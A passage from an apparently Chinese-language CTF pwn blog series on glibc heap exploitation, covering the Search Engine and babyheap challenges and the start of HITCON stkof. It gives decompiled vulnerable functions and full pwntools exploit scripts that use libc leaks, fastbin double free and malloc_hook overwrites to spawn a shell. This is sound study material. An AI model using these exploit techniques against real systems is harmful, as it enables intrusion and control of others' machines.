ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">""</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'PID: '</span> + str(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, description)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#first leak the libc</span></span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">    add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Description: "</span>)</span><br><span class="line">    result = p.recvuntil(<span class="string">"==================================="</span>)[:<span class="number">4</span>]</span><br><span class="line">    puts_addr = u32(result)</span><br><span class="line">    log.success(<span class="string">"puts_got = &#123;:#x&#125;"</span>.format(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#second fake bin</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">0x3f</span>:</span><br><span class="line">        add(<span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), <span class="string">'b'</span>*<span class="number">25</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0x804A2A8</span>)</span><br><span class="line">    add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">### begin fake </span></span><br><span class="line">    payload = p8(<span class="number">0</span>)*<span class="number">0x20</span> + p32(<span class="number">0x40</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x34</span>, <span class="string">'b'</span>)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'c'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    edit(payload)</span><br><span class="line">    delete()</span><br><span class="line">    p.recvuntil(<span class="string">'Okay order submitted!\n'</span>)</span><br><span class="line">    payload = p32(elf.got[<span class="string">'strlen'</span>])</span><br><span class="line">    payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">    add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">    <span class="comment">#one_gadget = libc_base + 0x5fbc5</span></span><br><span class="line">    <span class="comment">#payload = p32(one_gadget)</span></span><br><span class="line">    payload = p32(sys_addr) + <span class="string">";/bin/sh\x00"</span></span><br><span class="line">    edit(payload)</span><br><span class="line">    puts()</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="2015-9447-CTF-Search-Engine"><a href="#2015-9447-CTF-Search-Engine" class="headerlink" title="2015 9447 CTF : Search Engine"></a>2015 9447 CTF : Search Engine</h2><p>这道题说实话，我连功能怎么使用都不知道。。最后看了wp，也是似懂非懂，不过大概漏洞过程我是理解了的</p>
<p>先利用unsortbin泄露地址<br>double free 到malloc_hook<br>然后改malloc_hook为one_gadget<br>错位部分自己解决</p>
<p>最近学到一个新姿势，double free触发malloc_hook，下一篇写个最近遇到的有趣的题目</p>
<p>其余部分参考ctf-wiki</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'search'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'search'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="comment"># FORTIFY:  Enabled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsortedbin_offset_main_arena = offset_bin_main_arena(<span class="number">0</span>)</span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_sentence</span><span class="params">(s)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"3: Quit\n"</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Enter the sentence size:\n"</span>)</span><br><span class="line">    io.sendline(str(len(s)))</span><br><span class="line">    io.send(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_word</span><span class="params">(word)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"3: Quit\n"</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Enter the word size:\n"</span>)</span><br><span class="line">    io.sendline(str(len(word)))</span><br><span class="line">    io.send(word)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    smallbin_sentence = <span class="string">'s'</span> * <span class="number">0x85</span> + <span class="string">' m '</span></span><br><span class="line">    index_sentence(smallbin_sentence)</span><br><span class="line">    search_word(<span class="string">'m'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Found '</span> + str(len(smallbin_sentence)) + <span class="string">': '</span>)</span><br><span class="line">    unsortedbin_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'n'</span>)</span><br><span class="line">    <span class="keyword">return</span> unsortedbin_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 1. leak libc base</span></span><br><span class="line">    unsortedbin_addr = leak_libc()</span><br><span class="line">    main_arena_addr = unsortedbin_addr - unsortedbin_offset_main_arena</span><br><span class="line">    libc_base = main_arena_addr - main_arena_offset</span><br><span class="line">    log.success(<span class="string">'unsortedbin addr: '</span> + hex(unsortedbin_addr))</span><br><span class="line">    log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment"># 2. create cycle fastbin 0x70 size</span></span><br><span class="line">    index_sentence(<span class="string">'a'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#a</span></span><br><span class="line">    index_sentence(<span class="string">'b'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#b</span></span><br><span class="line">    index_sentence(<span class="string">'c'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#c</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">    search_word(<span class="string">'d'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># b-&gt;a-&gt;b-&gt;a-&gt;...</span></span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'n'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. fastbin attack to malloc_hook nearby chunk</span></span><br><span class="line">    fake_chunk_addr = main_arena_addr - <span class="number">0x33</span></span><br><span class="line">    fake_chunk = p64(fake_chunk_addr).ljust(<span class="number">0x60</span>, <span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(fake_chunk)</span><br><span class="line"></span><br><span class="line">    index_sentence(<span class="string">'a'</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(<span class="string">'b'</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    one_gadget_addr = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x60</span>, <span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(payload)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>




<h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">fill</span><span class="params">(chunk *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  result = read_num();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = LODWORD(a1[(<span class="keyword">int</span>)result].inuse);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">      result = read_num();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">        result = read_content(a1[v2].ptr, v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里写任意长度，堆溢出，原来想unlink发觉没全局变量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">free_chunk</span><span class="params">(chunk *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  result = read_num();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = LODWORD(a1[(<span class="keyword">int</span>)result].inuse);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(a1[v2].inuse) = <span class="number">0</span>;</span><br><span class="line">      a1[v2].size = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(a1[v2].ptr);</span><br><span class="line">      result = (__int64)&amp;a1[v2];</span><br><span class="line">      *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>free后没有置空，存在double free</p>
<h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol>
<li>这道题我原来觉得很简单，后面自己做起来才发觉问题较多，不是难，而是细节性的问题比较多</li>
<li>大体思路是构造unsortbin泄露libc地址，然后通过覆盖malloc_hook成one_gadget拿到shell</li>
<li>细节点1：你会发觉这道题你没有全局变量，所以要在堆上做文章，通过连续free两个chunk，第一个free的chunk的fd会指向第二个</li>
<li>细节点2：要绕过fastbin的长度检测，所以要多次溢出修改size，这里我建议不要急着free，我自己做的时候先free就出错了</li>
<li>细节点3： idx问题， 要注意标记好idx，不然自己都不知道哪个对应哪个</li>
<li>具体在exp里在标注下注释就好了</li>
</ol>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'babyheap'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'babyheap'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>)</span><br><span class="line">    Dump(<span class="number">0</span>)</span><br><span class="line">    Fill(<span class="number">0</span>, <span class="number">0x10</span>, <span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">    Free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#test()</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">    Allocate(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#细节点1</span></span><br><span class="line">    Free(<span class="number">2</span>)</span><br><span class="line">    Free(<span class="number">1</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">    Fill(<span class="number">0</span>, len(payload), payload)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    <span class="comment">#细节点2</span></span><br><span class="line">    Fill(<span class="number">3</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">    <span class="comment">#细节点2</span></span><br><span class="line">    Fill(<span class="number">3</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x80</span>) <span class="comment">#5</span></span><br><span class="line">    Free(<span class="number">4</span>) </span><br><span class="line">    Dump(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    io.success(<span class="string">"malloc_hook: 0x%x"</span> %malloc_hook)</span><br><span class="line">    one_gadget = <span class="number">0x45216</span> </span><br><span class="line">    one_gadget = <span class="number">0x4526a</span> <span class="comment">#0xf02a4 0xf1147</span></span><br><span class="line">    one_gadget = one_gadget + libc_base </span><br><span class="line">    ptr = malloc_hook<span class="number">-0x20</span><span class="number">-0x3</span></span><br><span class="line">    Allocate(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">    Free(<span class="number">4</span>)</span><br><span class="line">    payload = p64(ptr)</span><br><span class="line">    Fill(<span class="number">2</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">    Allocate(<span class="number">0x60</span>) <span class="comment">#6</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">    Fill(<span class="number">6</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x20</span>) <span class="comment">#7</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>fastbin的题目相对来说不难，可能是因为前面有基础了的原因了吧，以后多做下题巩固下就好</li>
<li>double free也是常用的攻击手段</li>
<li>逆向还得多学习，像搜索引擎那题，看都看不懂题目，做什么题。。。</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/" target="_blank" rel="noopener">ctf-wiki</a></p>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程4</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程4"><a href="#pwn堆入门系列教程4" class="headerlink" title="pwn堆入门系列教程4"></a>pwn堆入门系列教程4</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn堆入门系列教程2</a><br><a href="https://xz.aliyun.com/t/6252" target="_blank" rel="noopener">pwn堆入门系列教程3</a></p><p>序言：这次进入到unlink的学习了，unlink在第一节已经用上了，但我用起来还不是很流畅，还是去翻了第一节的笔记，最主要是指针的问题，可能没学好指针，理解了unlink后就简单做了</p><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><a id="more"></a>

<h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol>
<li>几乎无输出的题目</li>
<li>申请功能，申请指定大小size</li>
<li>删除功能，删除idx位置处的chunk</li>
<li>输出一些无用字符串，有个strlen，本来想用来做/bin/sh的，发觉也不行</li>
<li>编辑功能</li>
</ol>
<h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">fill</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  idx = atol(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  size = atoll(&amp;s);</span><br><span class="line">  ptr = globals[idx];</span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1u</span>LL, size, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1u</span>LL, size, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    size -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fill函数里也就是编辑功能处可以自定大小编辑，也就是说存在堆溢出</p>
<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>这里有个小细节，自己补充下知识，关于缓冲区的问题，这个细节也解决了我自己出pwn题的时候输出，为什么输出不了的问题<br>就是如果未设置缓冲区为0的话，这道题里是第一次调用fgets是要先申请1024大小的堆块作为缓冲区的，还有printf也要申请1024大小的堆块作为缓冲区</p>
